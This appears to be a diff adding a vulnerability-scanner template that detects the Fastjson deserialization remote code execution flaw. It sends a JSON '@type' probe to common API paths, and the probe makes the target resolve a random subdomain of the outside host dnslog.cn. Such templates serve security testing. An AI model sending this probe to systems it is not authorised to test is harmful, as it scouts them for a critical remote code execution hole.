@@ -1,0 +1,29 @@
+id: fastjson-rce
+info:
+  name: Fastjson RCE 检测
+  severity: critical
+  description: Fastjson 反序列化远程代码执行漏洞
+  tags: fastjson,rce,java,deserialization,critical
+  author: poxiao
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api"
+      - "{{BaseURL}}/api/v1"
+      - "{{BaseURL}}/rest"
+      - "{{BaseURL}}/json"
+    headers:
+      Content-Type: "application/json"
+    body: '{"@type":"java.net.Inet4Address","val":"{{randstr}}.dnslog.cn"}'
+    matchers-condition: or
+    matchers:
+      - type: status
+        status: [200, 400, 500]
+      - type: word
+        words:
+          - "fastjson"
+          - "autoType"
+          - "com.alibaba.fastjson"
+        condition: or
+        part: body
